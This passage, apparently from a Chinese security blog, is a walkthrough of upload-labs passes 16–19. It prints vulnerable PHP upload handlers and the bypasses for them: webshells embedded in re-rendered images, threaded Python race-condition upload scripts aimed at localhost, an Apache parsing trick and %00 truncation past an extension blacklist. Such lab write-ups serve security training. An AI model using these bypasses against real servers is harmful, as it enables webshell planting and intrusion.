+<p><img src="/2018/06/12/文件上传漏洞writeup/1528807332043.png" alt="img"></p>
+<p>同样没办法直接利用，需要配合文件包含或者文件解析漏洞。</p>
+<h2 id="pass-16"><a href="#pass-16" class="headerlink" title="pass 16"></a>pass 16</h2><h3 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h3><p>这里有个函数<code>imagecreatefromjpeg</code>，作用是由文件或 URL 创建一个新图象。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">    if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">    &#123;</span><br><span class="line">        //使用上传的图片生成新的图片</span><br><span class="line">        $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">        if($im == false)&#123;</span><br><span class="line">            $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            //给新图片指定文件名</span><br><span class="line">            srand(time());</span><br><span class="line">            $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">            $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">            imagejpeg($im,$newimagepath);</span><br><span class="line">            //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">            $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">            unlink($target_path);</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-13"><a href="#解题方法-13" class="headerlink" title="解题方法"></a>解题方法</h3><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。 但是这里似乎没有对渲染异常进行处理，直接在正常jpg,png图片内插入webshell代码就可以了。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528808043799.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528808124612.png" alt="img"></p>
+<h2 id="pass-17"><a href="#pass-17" class="headerlink" title="pass 17"></a>pass 17</h2><h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>这里的代码似乎没有问题，但是这里多了一个<code>unlink($upload_file);</code>，所以我的猜想这里应该是通过竞争条件，在删除之前，成功写入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &apos;上传失败！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-14"><a href="#解题方法-14" class="headerlink" title="解题方法"></a>解题方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">import hackhttp</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload(lists):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = &quot;&quot;&quot;POST /upload/Pass-17/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/upload-labs/Pass-17/index.php</span><br><span class="line">Cookie: pass=17</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span><br><span class="line">Content-Length: 341</span><br><span class="line"></span><br><span class="line">-----------------------------6696274297634</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">-----------------------------6696274297634</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">-----------------------------6696274297634--</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    code, head, html, redirect, log = hh.http(&apos;http://127.0.0.1/upload/Pass-17/index.php&apos;, raw=raw)</span><br><span class="line">    print(str(code) + &quot;\r&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(10)</span><br><span class="line">pool.map(upload, range(10000))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528808740705.png" alt="img"></p>
+<h2 id="pass-18"><a href="#pass-18" class="headerlink" title="pass 18"></a>pass 18</h2><h3 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h3><p>这题我本来真没思路，觉得应该没问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&apos;upload_file&apos;][&apos;name&apos;], $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;upload_file&apos;][&apos;size&apos;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload($UPLOAD_ADDR);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &apos;文件已经被上传，但没有重命名。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &apos;这个文件不能上传到服务器的临时文件存储目录。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &apos;上传失败，上传目录不可写。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &apos;上传失败，无法上传该类型文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &apos;上传失败，上传的文件过大。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &apos;上传失败，服务器已经存在相同名称文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &apos;文件无法上传，文件不能复制到目标目录。&apos;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &apos;未知错误！&apos;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>跟进看一下<code>MyUpload</code>。感觉没毛病啊。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class MyUpload&#123;    </span><br><span class="line"></span><br><span class="line">  var $cls_upload_dir = &quot;&quot;;         // Directory to upload to.</span><br><span class="line">   var $cls_filename = &quot;&quot;;           // Name of the upload file.</span><br><span class="line">   var $cls_tmp_filename = &quot;&quot;;       // TMP file Name (tmp name by php).</span><br><span class="line">  var $cls_max_filesize = 33554432; // Max file size.</span><br><span class="line">  var $cls_filesize =&quot;&quot;;            // Actual file size.</span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line">  var $cls_file_exists = 0;         // Set to 1 to check if file exist before upload.</span><br><span class="line">  var $cls_rename_file = 1;         // Set to 1 to rename file after upload.</span><br><span class="line">  var $cls_file_rename_to = &apos;&apos;;     // New name for the file after upload.</span><br><span class="line">  var $cls_verbal = 0;              // Set to 1 to return an a string instead of an error code.</span><br></pre></td></tr></table></figure>
+<p>后来看了下作者自己打包的环境，哇apache版本有解析漏洞。然后其实还是没思路，后来看了t00ls大佬说，要通过竞争条件问题解决重命名，不然可能找不到文件位置。</p>
+<h3 id="解题方法-15"><a href="#解题方法-15" class="headerlink" title="解题方法"></a>解题方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">import hackhttp</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload(lists):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = &quot;&quot;&quot;POST /upload/Pass-18/ HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://localhost/upload/Pass-18/</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------132691894330861</span><br><span class="line">Content-Length: 339</span><br><span class="line">Cookie: pass=18</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------132691894330861</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php.7Z&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">-----------------------------132691894330861</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">??????</span><br><span class="line">-----------------------------132691894330861--</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    code, head, html, redirect, log = hh.http(&apos;http://127.0.0.1/upload/Pass-18/index.php&apos;, raw=raw)</span><br><span class="line">    print(str(code) + &quot;\r&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(10)</span><br><span class="line">pool.map(upload, range(10000))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528809245482.png" alt="img"></p>
+<h2 id="pass-19"><a href="#pass-19" class="headerlink" title="pass 19"></a>pass 19</h2><h3 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&apos;save_name&apos;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &apos;/&apos; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &apos;上传失败！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &apos;禁止保存为该类型文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>从代码来看，好像黑名单都过滤，因此这里解决办法，似乎可以试试<code>%00</code>截断</p>
+<h3 id="解题办法-2"><a href="#解题办法-2" class="headerlink" title="解题办法"></a>解题办法</h3><p><img src="/2018/06/12/文件上传漏洞writeup/1528809572834.png" alt="img"></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>感觉代码考的上传类型有重复，作者说<code>除了Pass-19必须在linux下，其余Pass都可以在windows上运行）</code>，但是第19关在windows上也行，不清楚什么情况，感觉作者可以更新下。</p>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">upload-labs 上传漏洞靶场的解题方法</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/文件上传/" rel="tag"># 文件上传</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/05/从debug看php代码审计/" rel="next" title="从debug看php代码审计">
+                <i class="fa fa-chevron-left"></i> 从debug看php代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="l1nk3r" />
+            
+              <p class="site-author-name" itemprop="name">l1nk3r</p>
+              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sukaralin" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-写在前面"><span class="nav-text">0x01 写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-开始做题"><span class="nav-text">0x02 开始做题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-text">pass 01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-text">pass 02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-1"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-1"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-03"><span class="nav-text">pass 03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-2"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-2"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-04"><span class="nav-text">pass 04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-3"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-3"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-05"><span class="nav-text">pass 05</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-4"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-4"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-06"><span class="nav-text">pass 06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-5"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题办法"><span class="nav-text">解题办法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-07"><span class="nav-text">pass 07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-6"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题办法-1"><span class="nav-text">解题办法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-08"><span class="nav-text">pass 08</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-7"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-5"><span class="nav-text">解题方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NTFS-交换数据流"><span class="nav-text">NTFS 交换数据流</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-09"><span class="nav-text">pass 09</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-8"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-6"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-10"><span class="nav-text">pass 10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-9"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-7"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-text">pass 11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-10"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-8"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-12"><span class="nav-text">pass 12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-11"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-9"><span class="nav-text">解题方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-00截断原理"><span class="nav-text">php %00截断原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-13"><span class="nav-text">pass 13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-12"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-10"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-14"><span class="nav-text">pass 14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-13"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-11"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-15"><span class="nav-text">pass 15</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-14"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-12"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-16"><span class="nav-text">pass 16</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-15"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-13"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-17"><span class="nav-text">pass 17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-16"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-14"><span class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-18"><span class="nav-text">pass 18</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-17"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题方法-15"><span 